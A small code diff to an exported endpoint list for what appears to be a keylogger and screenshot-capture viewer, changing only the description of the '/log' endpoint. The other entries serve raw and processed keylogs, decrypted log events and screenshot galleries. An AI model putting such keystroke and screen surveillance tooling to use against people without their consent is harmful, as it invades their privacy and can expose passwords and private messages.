@@ -1,7 +1,7 @@
 export const endpointList = [
   { path: "/today", label: "today", description: "Today's processed keylog" },
   { path: "/today/raw", label: "today/raw", description: "Today's raw keylog" },
-  { path: "/log", label: "log", description: "Decrypted logevents from past 24 hours" },
+  { path: "/log", label: "log", description: "Aggregated decrypted keylogs JSON (defaults to past 24 hours)" },
   { path: "/log/json", label: "log/json", description: "Decrypted logevents JSON from past 24 hours" },
   { path: "/today/screenshots", label: "today/screenshots", description: "Today's screenshot image paths" },
   { path: "/today/screenshots/all", label: "today/screenshots/all", description: "Today's screenshot images gallery" },
